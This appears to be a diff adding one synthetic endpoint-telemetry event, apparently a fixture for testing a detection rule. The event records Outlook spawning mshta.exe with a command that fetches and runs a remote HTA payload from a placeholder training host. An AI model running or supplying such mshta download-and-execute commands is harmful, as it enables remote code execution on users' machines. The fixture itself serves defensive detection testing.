@@ -1,0 +1,1 @@
+{"schema_version":1,"synthetic":true,"event":{"TimeGenerated":"2026-09-03T12:00:00Z","DeviceName":"lab-device.example","AccountName":"synthetic-user","InitiatingProcessFileName":"OUTLOOK.EXE","FileName":"mshta.exe","FolderPath":"C:\\Windows\\System32\\mshta.exe","ProcessCommandLine":"mshta.exe https://training.example/payload.hta","ReportId":6001}}
